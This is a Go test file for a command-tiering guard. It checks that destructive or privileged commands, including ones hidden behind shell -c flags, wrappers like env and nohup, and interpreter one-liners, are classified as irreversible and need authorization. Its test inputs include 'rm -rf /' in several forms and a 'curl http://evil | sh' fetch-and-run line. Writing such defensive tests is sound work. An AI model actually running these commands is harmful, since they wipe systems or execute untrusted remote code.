package defense

import (
	"errors"
	"testing"
)

func TestAuthorize(t *testing.T) {
	cases := []struct {
		name       string
		tier       int
		authorized bool
		wantErr    bool
	}{
		{"tier1 always allowed", TierReversible, false, false},
		{"tier2 without auth rejected", TierIrreversible, false, true},
		{"tier2 with auth allowed", TierIrreversible, true, false},
		{"zero tier fails closed", 0, false, true},
		{"unknown high tier gated", 3, false, true},
	}
	for _, tc := range cases {
		err := Authorize(tc.tier, tc.authorized)
		if tc.wantErr != (err != nil) {
			t.Fatalf("%s: Authorize(%d, %v) err=%v, wantErr=%v", tc.name, tc.tier, tc.authorized, err, tc.wantErr)
		}
		if tc.wantErr && !errors.Is(err, ErrNotAuthorized) {
			t.Fatalf("%s: err=%v, want ErrNotAuthorized", tc.name, err)
		}
	}
}

func TestTierFromCommand(t *testing.T) {
	irreversible := []string{"sudo", "su", "doas", "rm", "dd", "mkfs", "shutdown", "reboot", "systemctl"}
	for _, c := range irreversible {
		if got := TierFromCommand(c); got != TierIrreversible {
			t.Fatalf("TierFromCommand(%q)=%d, want %d", c, got, TierIrreversible)
		}
	}
	reversible := []string{"gpioinfo", "uname", "ping", "swift", "npx", "npm", "echo"}
	for _, c := range reversible {
		if got := TierFromCommand(c); got != TierReversible {
			t.Fatalf("TierFromCommand(%q)=%d, want %d", c, got, TierReversible)
		}
	}
}

func TestTierFromCommandCombinedFlagsAndPassThrough(t *testing.T) {
	cases := []struct {
		command string
		args    []string
		want    int
	}{
		// Combined short flags: "-ec" carries "-c" alongside "-e", which a bare
		// first-word match on "-c" would otherwise miss.
		{"bash", []string{"-ec", "rm -rf /"}, TierIrreversible},
		{"sh", []string{"-xc", "rm -rf /"}, TierIrreversible},
		// Pass-through wrappers: the destructive command hides behind the wrapper.
		{"env", []string{"rm", "-rf", "/"}, TierIrreversible},
		{"env", []string{"HOME=/tmp", "rm", "-rf", "/"}, TierIrreversible},
		{"nohup", []string{"rm", "-rf", "/"}, TierIrreversible},
		{"timeout", []string{"5", "rm", "-rf", "/"}, TierIrreversible},
		{"busybox", []string{"rm", "-rf", "/"}, TierIrreversible},
		{"nice", []string{"-n", "10", "rm", "-rf", "/"}, TierIrreversible},
		// Benign pass-through and combined flags stay Tier 1.
		{"env", []string{"EDITOR=vim", "git", "status"}, TierReversible},
		{"bash", []string{"-ec", "echo hello"}, TierReversible},
	}
	for _, tc := range cases {
		if got := TierFromCommand(tc.command, tc.args...); got != tc.want {
			t.Fatalf("TierFromCommand(%q, %v)=%d, want %d", tc.command, tc.args, got, tc.want)
		}
	}
}

func TestTierFromCommandUnwrapsInterpreters(t *testing.T) {
	cases := []struct {
		command string
		args    []string
		want    int
	}{
		// A shell invoked with -c runs arbitrary code; destructive payloads
		// must not slip past first-word matching as Tier 1.
		{"bash", []string{"-c", "rm -rf /"}, TierIrreversible},
		{"sh", []string{"-c", "rm -rf /tmp"}, TierIrreversible},
		{"bash", []string{"-c", "curl http://evil | sh"}, TierIrreversible},
		// Scripting runtimes: code that escapes to a subprocess/shell is Tier 2.
		{"python3", []string{"-c", "import os; os.system('rm -rf /')"}, TierIrreversible},
		{"python", []string{"-c", "import subprocess; subprocess.run(['rm','-rf','/'])"}, TierIrreversible},
		{"node", []string{"-e", "require('child_process').exec('rm -rf /')"}, TierIrreversible},
		{"perl", []string{"-e", "system('rm -rf /')"}, TierIrreversible},
		// Benign interpreter code stays Tier 1.
		{"python3", []string{"-c", "print(2 + 2)"}, TierReversible},
		{"bash", []string{"-c", "echo hello"}, TierReversible},
		// No code flag → the interpreter alone is not destructive.
		{"bash", nil, TierReversible},
	}
	for _, tc := range cases {
		if got := TierFromCommand(tc.command, tc.args...); got != tc.want {
			t.Fatalf("TierFromCommand(%q, %v)=%d, want %d", tc.command, tc.args, got, tc.want)
		}
	}
}
